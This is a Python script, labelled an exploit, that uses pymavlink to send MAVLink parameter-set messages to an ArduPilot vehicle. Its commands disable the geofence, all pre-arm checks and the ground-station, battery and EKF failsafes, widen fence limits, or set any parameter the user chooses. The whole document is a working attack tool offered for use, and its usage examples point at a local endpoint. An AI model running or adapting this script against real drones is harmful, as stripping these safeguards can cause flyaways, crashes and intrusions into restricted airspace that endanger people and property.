#!/usr/bin/env python3
"""
Parameter Manipulation Exploit Script
Modifies critical ArduPilot parameters to disable safety features
"""

import sys
import time
from pymavlink import mavutil

def set_parameter(connection, param_name, param_value, param_type=None):
    """
    Set a parameter value
    
    Args:
        connection: MAVLink connection object
        param_name: Parameter name (max 16 chars)
        param_value: Parameter value
        param_type: Parameter type (auto-detected if None)
    
    Returns:
        True if successful
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Auto-detect parameter type
    if param_type is None:
        if isinstance(param_value, bool):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_UINT8
            param_value = 1 if param_value else 0
        elif isinstance(param_value, int):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_INT32
        elif isinstance(param_value, float):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        else:
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    
    # Ensure param_name is exactly 16 bytes (null-padded)
    param_id = param_name.ljust(16, '\x00')[:16]
    
    print(f"[*] Setting parameter: {param_name} = {param_value} (type: {param_type})")
    
    # Send PARAM_SET message
    connection.mav.param_set_send(
        target_system,
        target_component,
        param_id.encode('utf-8'),
        param_value,
        param_type
    )
    
    # Wait for acknowledgment
    time.sleep(0.5)
    msg = connection.recv_match(type='PARAM_VALUE', blocking=True, timeout=2)
    if msg:
        received_name = msg.param_id.rstrip('\x00')
        if received_name == param_name:
            print(f"[+] Parameter set successfully: {received_name} = {msg.param_value}")
            return True
    
    print(f"[-] Failed to set parameter or no acknowledgment received")
    return False

def disable_geofence(connection):
    """Disable geofence by setting FENCE_ENABLE to 0"""
    print("[*] Disabling geofence...")
    return set_parameter(connection, 'FENCE_ENABLE', 0)

def disable_arming_checks(connection):
    """Disable arming checks"""
    print("[*] Disabling arming checks...")
    # ARMING_CHECK parameter: bitmask, 0 = disable all checks
    return set_parameter(connection, 'ARMING_CHECK', 0)

def modify_geofence_radius(connection, radius):
    """Modify geofence radius"""
    print(f"[*] Setting geofence radius to {radius} meters...")
    return set_parameter(connection, 'FENCE_RADIUS', radius)

def modify_geofence_altitude(connection, max_alt):
    """Modify maximum geofence altitude"""
    print(f"[*] Setting max geofence altitude to {max_alt} meters...")
    return set_parameter(connection, 'FENCE_ALT_MAX', max_alt)

def disable_failsafe(connection):
    """Disable failsafe features"""
    print("[*] Disabling failsafe features...")
    # Set various failsafe parameters
    set_parameter(connection, 'FS_GCS_ENABLE', 0)  # Disable GCS failsafe
    set_parameter(connection, 'FS_BATT_ENABLE', 0)  # Disable battery failsafe
    set_parameter(connection, 'FS_EKF_ACTION', 0)  # Disable EKF failsafe
    return True

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 parameter_manipulation.py <connection> <action> [value]")
        print("\nActions:")
        print("  disable-geofence          Disable geofence (FENCE_ENABLE=0)")
        print("  disable-arming            Disable arming checks")
        print("  set-geofence-radius <m>  Set geofence radius in meters")
        print("  set-geofence-alt <m>     Set max geofence altitude in meters")
        print("  disable-failsafe         Disable failsafe features")
        print("  set <name> <value>       Set custom parameter")
        print("\nExample: python3 parameter_manipulation.py udp:127.0.0.1:14550 disable-geofence")
        print("Example: python3 parameter_manipulation.py udp:127.0.0.1:14550 set-geofence-radius 1000")
        print("Example: python3 parameter_manipulation.py udp:127.0.0.1:14550 set FENCE_ENABLE 0")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    action = sys.argv[2]
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Execute action
    success = False
    
    if action == 'disable-geofence':
        success = disable_geofence(connection)
    elif action == 'disable-arming':
        success = disable_arming_checks(connection)
    elif action == 'set-geofence-radius':
        if len(sys.argv) < 4:
            print("[-] Missing radius value")
            sys.exit(1)
        radius = float(sys.argv[3])
        success = modify_geofence_radius(connection, radius)
    elif action == 'set-geofence-alt':
        if len(sys.argv) < 4:
            print("[-] Missing altitude value")
            sys.exit(1)
        alt = float(sys.argv[3])
        success = modify_geofence_altitude(connection, alt)
    elif action == 'disable-failsafe':
        success = disable_failsafe(connection)
    elif action == 'set':
        if len(sys.argv) < 5:
            print("[-] Missing parameter name or value")
            sys.exit(1)
        param_name = sys.argv[3]
        try:
            param_value = float(sys.argv[4])
            if '.' not in sys.argv[4]:
                param_value = int(param_value)
        except ValueError:
            param_value = sys.argv[4]
        success = set_parameter(connection, param_name, param_value)
    else:
        print(f"[-] Unknown action: {action}")
        sys.exit(1)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
